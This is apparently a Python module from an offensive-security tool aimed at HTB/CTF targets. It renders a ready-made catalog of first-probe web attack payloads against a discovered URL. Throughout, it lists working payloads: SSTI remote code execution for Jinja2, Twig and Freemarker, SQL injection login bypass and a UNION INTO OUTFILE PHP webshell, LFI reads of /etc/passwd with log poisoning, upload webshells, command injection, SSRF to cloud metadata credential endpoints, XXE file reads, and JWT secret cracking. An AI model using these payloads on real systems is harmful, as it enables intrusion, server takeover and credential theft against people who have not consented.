"""Light, confirm-gated web attack-surface probes.

The most common HTB/CTF web footholds are a handful of injection classes -
SSTI, SQLi, LFI, file upload, command injection, SSRF, XXE, JWT. breachload does
not fire these automatically (they can be intrusive and need a real parameter),
but once an HTTP service is known it should *name the tests to run* with the
exact first-probe payloads, so the operator isn't starting from a blank page.

This is deterministic catalog data (no LLM), rendered against the discovered web
URL. Each block is a technique: a confirmation probe, then the follow-up if it
lands. Curated from recurring writeup patterns (incl. SSRF -> cloud metadata).
"""

from __future__ import annotations

from dataclasses import dataclass, field


@dataclass
class WebProbe:
    technique: str
    why: str
    probes: list[str] = field(default_factory=list)


def web_probes(url: str) -> list[WebProbe]:
    """The web attack-surface probe catalog, rendered for `url`."""
    return [
        WebProbe("SSTI (template injection)",
                 "reflected input in a template -> RCE; the {{7*7}}=49 tell",
                 [f"# inject in each parameter, look for 49:  {url}/?q=" + "{{7*7}}",
                  "# Jinja2 RCE: {{cycler.__init__.__globals__.os.popen('id').read()}}",
                  "# Twig: {{['id']|filter('system')}}   Freemarker: "
                  "${\"freemarker.template.utility.Execute\"?new()('id')}"]),
        WebProbe("SQL injection",
                 "login bypass / data theft; error- or boolean-based",
                 ["# login bypass:  username: ' OR 1=1-- -",
                  f"sqlmap -u '{url}/?id=1' --batch --level 3 --risk 2",
                  "# MySQL FILE priv -> webshell:  ' UNION SELECT \"<?php system($_GET[c]);?>\" "
                  "INTO OUTFILE '/var/www/html/s.php'-- -"]),
        WebProbe("LFI / path traversal",
                 "read files, then RCE via wrapper or log poisoning",
                 [f"curl --path-as-is '{url}/?page=../../../../../../etc/passwd'",
                  f"curl '{url}/?page=php://filter/convert.base64-encode/resource=index'",
                  "# log poisoning: put <?php system($_GET[c]);?> in User-Agent, then "
                  "include /var/log/apache2/access.log"]),
        WebProbe("File upload",
                 "drop a webshell; bypass extension/type filters",
                 ["# try .phtml/.php5/.php7, double ext (shell.php.jpg), null byte, "
                  "magic bytes (GIF89a; then <?php system($_GET[c]);?>)",
                  "# webshell body:  <?php system($_REQUEST['c']); ?>"]),
        WebProbe("Command injection",
                 "shell metacharacters in a param reach a shell",
                 [f"curl '{url}/?host=127.0.0.1;id'   # also try |id  `id`  $(id)  %0aid",
                  "# blind: ...;ping -c1 <LHOST>   (watch tcpdump -i tun0 icmp)"]),
        WebProbe("SSRF (incl. cloud metadata)",
                 "make the server fetch a URL you choose -> internal svcs / IMDS creds",
                 [f"curl '{url}/?url=http://127.0.0.1:80/'   # internal port scan",
                  "# AWS IMDS:  http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                  "# GCP:  http://169.254.169.254/computeMetadata/v1/  (Metadata-Flavor: Google)"]),
        WebProbe("XXE",
                 "XML input with an external entity -> file read / SSRF",
                 ["# <?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM "
                  "\"file:///etc/passwd\">]><r>&x;</r>"]),
        WebProbe("JWT",
                 "forge/verify-bypass a JSON Web Token",
                 ["# alg:none forge, or crack the HS256 secret:",
                  "hashcat -m 16500 <jwt> /usr/share/wordlists/rockyou.txt",
                  "# then re-sign with the cracked secret (jwt_tool -S hs256 -p <secret>)"]),
    ]


def probe_lines(url: str) -> list[str]:
    """Flatten the catalog to printable action lines for a suggestion."""
    out: list[str] = []
    for p in web_probes(url):
        out.append(f"# {p.technique} - {p.why}")
        out.extend("    " + line for line in p.probes)
    return out
